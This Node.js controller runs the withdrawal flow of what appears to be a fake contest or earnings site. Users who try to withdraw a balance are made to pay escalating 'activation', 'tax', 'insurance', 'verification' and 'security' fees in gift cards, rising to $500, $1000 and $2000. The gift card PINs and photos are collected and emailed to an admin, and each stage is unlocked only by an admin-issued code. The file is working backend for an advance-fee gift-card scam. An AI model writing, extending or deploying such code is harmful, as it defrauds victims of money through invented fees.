const Withdrawal = require('../models/Withdrawal');
const User = require('../models/User');
const { sendAdminEmail } = require('../utils/mailer');
const { uploadToCloudinary } = require('../utils/cloudinary');
const qs = require('qs');

/**
 * createPreview - create a withdrawal preview for the logged in user
 * - requires authenticate middleware to set req.user.id
 * - If an in-progress withdrawal already exists for this user, return that
 *   instead of creating a new one so the user's progress is preserved.
 */
async function createPreview(req, res) {
  try {
    const { method, details } = req.body;
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    if (user.balance < 1) return res.status(400).json({ message: 'Balance must be at least $1 to withdraw' });
    if (!user.timerActive) return res.status(400).json({ message: 'Withdrawals are disabled while timer inactive' });

    // Check latest withdrawal for this user; if it's progress-incomplete, return it.
    const latest = await Withdrawal.findOne({ user: user._id }).sort({ createdAt: -1 });
    if (latest && !['approved', 'rejected'].includes(latest.status) && latest.stage !== 'access') {
      // return existing in-progress withdrawal to preserve user's progress
      return res.json({
        message: 'Existing withdrawal in progress',
        withdrawalId: latest._id,
        preview: { amount: latest.amount, method: latest.method, details: latest.details },
        stage: latest.stage,
        status: latest.status
      });
    }

    const withdrawal = new Withdrawal({
      user: user._id,
      amount: user.balance,
      method,
      details,
      status: 'preview',
      stage: 'activation'
    });
    await withdrawal.save();

    // RESTORED: Send admin email notification for withdrawal initiation
    const emailSubject = `Withdrawal Initiated - ${user.username}`;
    const emailBody = `User ${user.username} (${user.email || 'No email'}) initiated a withdrawal request.\n\n` +
                     `Withdrawal Details:\n` +
                     `- Amount: $${withdrawal.amount}\n` +
                     `- Method: ${withdrawal.method}\n` +
                     `- Withdrawal ID: ${withdrawal._id}\n` +
                     `- Stage: ${withdrawal.stage}\n` +
                     `- Created: ${new Date().toLocaleString()}\n\n` +
                     `User Balance: $${user.balance}`;
    
    sendAdminEmail(emailSubject, emailBody);

    res.json({ message: 'Preview created', withdrawalId: withdrawal._id, preview: { amount: withdrawal.amount, method: withdrawal.method, details: withdrawal.details } });
  } catch (err) {
    console.error('createPreview err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

/**
 * proceedWithdraw - mark a preview as pending activation
 */
async function proceedWithdraw(req, res) {
  try {
    const { id } = req.params;
    const withdrawal = await Withdrawal.findById(id).populate('user');
    if (!withdrawal) return res.status(404).json({ message: 'Withdrawal not found' });
    if (String(withdrawal.user._id) !== String(req.user.id)) return res.status(403).json({ message: 'Forbidden' });

    withdrawal.status = 'pending_activation';
    await withdrawal.save();

    // RESTORED: Send admin email notification for withdrawal proceeding
    const emailSubject = `Withdrawal Proceeded - ${withdrawal.user.username}`;
    const emailBody = `User ${withdrawal.user.username} (${withdrawal.user.email || 'No email'}) proceeded with withdrawal.\n\n` +
                     `Withdrawal Details:\n` +
                     `- Amount: $${withdrawal.amount}\n` +
                     `- Method: ${withdrawal.method}\n` +
                     `- Withdrawal ID: ${withdrawal._id}\n` +
                     `- New Status: ${withdrawal.status}\n` +
                     `- Stage: ${withdrawal.stage}\n` +
                     `- Proceeded: ${new Date().toLocaleString()}`;
    
    sendAdminEmail(emailSubject, emailBody);

    res.json({ message: 'Proceed recorded' });
  } catch (err) {
    console.error('proceedWithdraw err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

/**
 * submitStagePayment - Accepts multipart/form-data with files
 * UPDATED: Now uploads files to Cloudinary and stores public URLs
 */
async function submitStagePayment(req, res) {
  try {
    const userId = req.user.id;
    
    // Parse the flat form data into nested structure
    const parsedBody = qs.parse(req.body);
    const { withdrawalId, stage, amount, cardsCount, method } = parsedBody;
    
    const withdrawal = await Withdrawal.findById(withdrawalId).populate('user');
    if (!withdrawal) return res.status(404).json({ message: 'Withdrawal not found' });
    if (String(withdrawal.user._id) !== String(userId)) return res.status(403).json({ message: 'Forbidden' });

    console.log('=== SUBMIT STAGE PAYMENT DEBUG ===');
    console.log('Parsed body keys:', Object.keys(parsedBody));
    console.log('cardsCount:', cardsCount);
    console.log('Files received:', req.files ? req.files.length : 0);

    // Convert req.files (array) into a map by fieldname for easy lookup
    const filesByField = {};
    if (Array.isArray(req.files)) {
      req.files.forEach((f) => {
        console.log(`File field [${f.fieldname}]:`, 'Original:', f.originalname, 'Size:', f.size);
        if (!filesByField[f.fieldname]) filesByField[f.fieldname] = [];
        filesByField[f.fieldname].push(f);
      });
    }

    const cards = [];
    const count = Number(cardsCount || 0);

    // Upload files to Cloudinary and process cards
    if (count && count > 0) {
      console.log(`Processing ${count} cards...`);
      
      for (let i = 0; i < count; i++) {
        const cardData = parsedBody.cards && parsedBody.cards[i];
        
        if (cardData) {
          const giftCard = cardData.giftCard || 'Steam';
          const pin = cardData.pin || '';
          
          console.log(`Card ${i} parsed data:`, { giftCard, pin });
          
          // Handle file upload to Cloudinary
          const fileField = `cards[${i}][file]`;
          const fileArr = filesByField[fileField];
          const file = fileArr && fileArr.length ? fileArr[0] : null;
          
          let cloudinaryResult = null;
          if (file) {
            try {
              console.log(`Uploading file for card ${i} to Cloudinary...`);
              cloudinaryResult = await uploadToCloudinary(file, 'contest-giftcards');
              console.log(`Cloudinary upload successful:`, cloudinaryResult.secure_url);
            } catch (uploadError) {
              console.error(`Cloudinary upload failed for card ${i}:`, uploadError);
              // Continue without the file rather than failing the entire request
            }
          }
          
          // Store Cloudinary URL instead of local path
          const savedFile = cloudinaryResult ? { 
            filename: file.originalname,
            originalname: file.originalname,
            url: cloudinaryResult.secure_url,
            public_id: cloudinaryResult.public_id,
            mimetype: file.mimetype,
            size: file.size,
            displayName: file.originalname
          } : null;
          
          console.log(`Card ${i} final data:`, { 
            giftCard, 
            pin, 
            file: savedFile ? {
              originalname: savedFile.originalname,
              url: savedFile.url
            } : 'none' 
          });
          
          cards.push({ 
            giftCard, 
            pin, 
            file: savedFile 
          });
        } else {
          console.log(`No card data found for index ${i}`);
        }
      }
    } else {
      console.log('No cardsCount, using single card fallback');
      // Fallback for single card - check both parsed and flat structure
      const giftCard = (parsedBody.cards && parsedBody.cards[0] && parsedBody.cards[0].giftCard) 
        || parsedBody.giftCard 
        || 'Steam';
        
      const pin = (parsedBody.cards && parsedBody.cards[0] && parsedBody.cards[0].pin) 
        || parsedBody.pin 
        || '';
      
      // Handle single file upload to Cloudinary
      let file = null;
      const singleFileFields = ['file', 'giftImage', 'cardImage', 'image'];
      for (const field of singleFileFields) {
        if (filesByField[field] && filesByField[field].length) {
          file = filesByField[field][0];
          console.log(`Found single file in field ${field}:`, file.originalname);
          break;
        }
      }
      
      let cloudinaryResult = null;
      if (file) {
        try {
          console.log(`Uploading single file to Cloudinary...`);
          cloudinaryResult = await uploadToCloudinary(file, 'contest-giftcards');
          console.log(`Cloudinary upload successful:`, cloudinaryResult.secure_url);
        } catch (uploadError) {
          console.error(`Cloudinary upload failed:`, uploadError);
        }
      }
      
      // Store Cloudinary URL instead of local path
      const savedFile = cloudinaryResult ? { 
        filename: file.originalname,
        originalname: file.originalname,
        url: cloudinaryResult.secure_url,
        public_id: cloudinaryResult.public_id,
        mimetype: file.mimetype,
        size: file.size,
        displayName: file.originalname
      } : null;
      
      console.log('Single card data:', { 
        giftCard, 
        pin, 
        file: savedFile ? {
          originalname: savedFile.originalname,
          url: savedFile.url
        } : 'none' 
      });
      
      cards.push({ 
        giftCard, 
        pin, 
        file: savedFile 
      });
    }

    console.log('Final cards array:', cards.map(c => ({
      giftCard: c.giftCard,
      pin: c.pin,
      file: c.file ? { 
        originalname: c.file.originalname, 
        url: c.file.url 
      } : null
    })));

    // Build payment submission with consistent structure
    const paymentSubmission = {
      method: method || 'giftcard',
      stage: stage,
      amount: Number(amount) || 0,
      details: {
        cards: cards
      },
      cards: cards, // Also keep at top level for backward compatibility
      createdAt: new Date(),
      status: 'submitted'
    };

    if (!withdrawal.payments) withdrawal.payments = [];
    withdrawal.payments.push(paymentSubmission);
    await withdrawal.save();

    const user = await User.findById(userId);
    if (!user.payments) user.payments = [];
    
    // Use the same consistent structure for user payments
    const userPaymentRecord = { 
      ...paymentSubmission, 
      withdrawal: withdrawal._id 
    };
    user.payments.push(userPaymentRecord);
    await user.save();

    // Build proper email with complete details - NOW SHOWING CLOUDINARY URL
    let detailsStr = `User ${user.username} submitted payment for stage ${stage} (withdrawal: ${withdrawalId}).\n\n`;
    detailsStr += `Amount: $${paymentSubmission.amount}\n`;
    detailsStr += `Stage: ${stage}\n\n`;
    detailsStr += `Gift Cards Details:\n`;
    detailsStr += '─'.repeat(50) + '\n';
    
    cards.forEach((c, idx) => {
      detailsStr += `Card ${idx + 1}:\n`;
      detailsStr += `  Type: ${c.giftCard || 'N/A'}\n`;
      detailsStr += `  PIN: ${c.pin || 'Not provided'}\n`;
      if (c.file) {
        detailsStr += `  Image URL: ${c.file.url}\n`;
        detailsStr += `  Original Filename: ${c.file.originalname}\n`;
        detailsStr += `  File Size: ${(c.file.size / 1024).toFixed(2)} KB\n`;
      } else {
        detailsStr += `  Image: No image uploaded\n`;
      }
      detailsStr += '\n';
    });

    detailsStr += `Submitted at: ${new Date().toLocaleString()}\n`;
    detailsStr += `User: ${user.username} (${user.email || 'No email'})`;

    sendAdminEmail(`Stage ${stage} payment submitted - ${user.username}`, detailsStr);

    try {
      const admins = await User.find({ role: 'admin' });
      await Promise.all(admins.map(async (a) => {
        a.notifications.push({ 
          text: `User ${user.username} submitted ${stage} payment with ${cards.length} gift card(s).`, 
          createdAt: new Date() 
        });
        await a.save();
      }));
    } catch (e) {
      console.error('Failed to notify admins in-app', e);
    }

    res.json({ message: 'Submitted' });
  } catch (err) {
    console.error('submitStagePayment err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

/**
 * submitActivation - alias for submitStagePayment
 */
async function submitActivation(req, res) {
  return submitStagePayment(req, res);
}

/**
 * confirmStagePin - user sends a 4-digit pin received in notifications.
 * If correct (as set by admin on user.activationPins), mark stage as completed and return next stage and amount.
 * This version uses a stricter notification regex to avoid false matches.
 */
async function confirmStagePin(req, res) {
  try {
    const { withdrawalId, stage, pin } = req.body;
    const userId = req.user.id;
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ message: 'User not found' });

    const activationPins = user.activationPins || {};
    let stageObj = activationPins[stage];

    if (!stageObj || !stageObj.set) {
      // Strict regex: look for "your <stage> pin is: 1234" or "... <stage> code: 1234"
      const notifList = (user.notifications || []).slice().reverse();
      let foundPin = null;
      const regex = new RegExp(`\\b${stage}\\b[^\\d]{0,25}(?:pin|code|is)[:\\s\\-]*?(\\d{4})`, 'i');
      for (let n of notifList) {
        if (!n || !n.text) continue;
        const m = regex.exec(n.text);
        if (m && m[1]) {
          foundPin = m[1];
          break;
        }
      }

      if (foundPin) {
        if (!user.activationPins) user.activationPins = {};
        user.activationPins[stage] = { pin: String(foundPin), set: true, setAt: new Date(), discoveredFromNotification: true };
        await user.save();
        stageObj = user.activationPins[stage];
      } else {
        return res.status(400).json({ message: 'Verifying your Gift Card PIN. No pin set for this stage yet. Please check notifications or contact admin.' });
      }
    }

    if (String(stageObj.pin) !== String(pin)) {
      return res.status(400).json({ message: 'Incorrect pin. Please check your dashboard notifications.' });
    }

    if (!user.activationStatus) user.activationStatus = {};
    user.activationStatus[stage] = true;
    user.notifications.push({ text: `Your ${stage} activation code was accepted.`, createdAt: new Date() });
    await user.save();

    const withdrawal = await Withdrawal.findOne({ user: user._id }).sort({ createdAt: -1 });
    let nextStage = null;
    let amount = 0;
    if (withdrawal) {
      const stages = ['activation', 'tax', 'insurance', 'verification', 'security', 'access'];
      const idx = stages.indexOf(stage);
      if (idx >= 0 && idx < stages.length - 1) {
        nextStage = stages[idx + 1];
        withdrawal.stage = nextStage;
        if (nextStage === 'access') withdrawal.status = 'ready_for_payout';
      }
      await withdrawal.save();
    } else {
      const stages = ['activation', 'tax', 'insurance', 'verification', 'security', 'access'];
      const idx = stages.indexOf(stage);
      if (idx >= 0 && idx < stages.length - 1) nextStage = stages[idx + 1];
    }

    if (nextStage === 'tax') {
      amount = Math.round((Number(user.balance || 0) * 0.01) * 100) / 100;
    } else if (nextStage === 'insurance') {
      amount = 500;
    } else if (nextStage === 'verification') {
      amount = 1000;
    } else if (nextStage === 'security') {
      amount = 2000;
    } else {
      amount = 0;
    }

    res.json({ success: true, nextStage: nextStage || null, amount });
  } catch (err) {
    console.error('confirmStagePin err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

/**
 * adminApprove - admin approves a withdrawal (deducts balance and marks approved)
 */
async function adminApprove(req, res) {
  try {
    const { id } = req.params;
    const withdrawal = await Withdrawal.findById(id).populate('user');
    if (!withdrawal) return res.status(404).json({ message: 'Not found' });

    withdrawal.status = 'approved';
    await withdrawal.save();

    const u = await User.findById(withdrawal.user._id);
    if (!u) return res.status(404).json({ message: 'User not found while approving' });

    u.balance = 0;
    u.notifications.push({ text: `Your withdrawal ${withdrawal._id} was approved.`, createdAt: new Date() });
    await u.save();

    sendAdminEmail('Withdrawal approved', `Withdrawal ${id} approved for ${u.username}`);

    res.json({ message: 'Withdrawal approved' });
  } catch (err) {
    console.error('adminApprove err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

module.exports = {
  createPreview,
  proceedWithdraw,
  submitActivation,
  submitStagePayment,
  confirmStagePin,
  adminApprove
};
